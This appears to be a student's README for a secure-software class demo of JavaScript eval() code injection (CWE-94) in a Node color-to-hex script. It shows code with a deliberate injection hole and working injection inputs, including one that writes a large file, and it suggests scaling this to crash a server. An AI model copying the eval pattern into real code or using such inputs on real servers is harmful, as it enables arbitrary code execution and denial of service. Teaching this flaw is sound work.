# JavaScript `eval()` Code Injection Example  

## Description  
This exploits a Node script which is vulnerable to code injection ([CWE-94](https://cwe.mitre.org/data/definitions/94.html)) done for my Engineering Secure Software class as a demo.  I did a quick writeup for the vulnerability [here](code-injection-writeup.pdf)

## Instructions
I have included a script which will take a sting of a color in lowercase and output a hex value that matches that color, for example:
```
Enter a color in lowercase to get its hex value (e.x. blue):  
purple
#800080
```
The bulk of the script's logic can be found here:
``` javascript
var colorHexes = {
    red: '#FF0000',
    yellow: '#FFFF00',
    blue: '#0000FF',
    black: '#000000',
    white: '#FFFFFF',
    green: '#008000',
    purple: '#800080',
    orange: '#FFA500'
};

r.question('Enter a color in lowercase to get its hex value (e.x. blue): ', function (statement) {
    console.log(eval('colorHexes.' + statement));
    process.stdin.pause();
});
```
This takes the user input and places it right into an `eval()` call.  `eval()` will take the string (including the user input) and execute it as JavaScript code.  This statement will get the property of the `colorHexes` object that matches the input to easily map inputted colors to outputted hex values.  The problem with this, however, is that the user can end the line being evaluated using a `;` and execute arbitrary JavaScript code.

For example: you can get the console to output a "Hello World!" like so:
```
Enter a color in lowercase to get its hex value (e.x. blue):
>yellow;console.log('Hello World!');
Hello World!
undefined
```
Or you can take this script:
``` javascript
var fs=require("fs"),
stream=fs.createWriteStream("bigFile.txt",{flags:"w"});
const megabyte="1000000",
outputStr="thisisabigfile";
for(var i=0;i<megabyte/outputStr.length;i++) {
	stream.write("thisisabigfile");
}
```
Which will create a 1MB file called "bigFile.txt", and exploiting the script into executing it like so:
```
Enter a color in lowercase to get its hex value (e.x. blue):
>purple; var fs=require("fs"),stream=fs.createWriteStream("bigFile.txt",{flags:"w"});const megabyte="1000000",outputStr="thisisabigfile";for(var i=0;i<megabyte/outputStr.length;i++)stream.write("thisisabigfile");
false
```
If you were to modify this script slightly, you could create a much larger file (1GB, 1TB, etc.) which could lead to the machine the server is being hosted on to have poor performance due, or even crash altogether, causing a denial of service.  
  
Another exploit could use the [Node OS module](https://nodejs.org/api/os.html) to expose information of the machine that the Node server is running on.  When arbitrary code can be executed on a server, any number of things can happen to compromise the confidentiality or integrity of the data on the server - or to harm the availability of that server.

## Makefile
I've included a Makefile with two targets:  
* `default` will give the intended input into the program once, then exploit the program to call a "secret function"
* `bigfile` will exploit the script create a 1MB file (like explained above) called `bigFile.txt`

#### Note
This Makefile **does not** work with Node version 0.6.12 (the version currently on the SE lab machines), I have tested it and had it work on Node version 4.6.1.
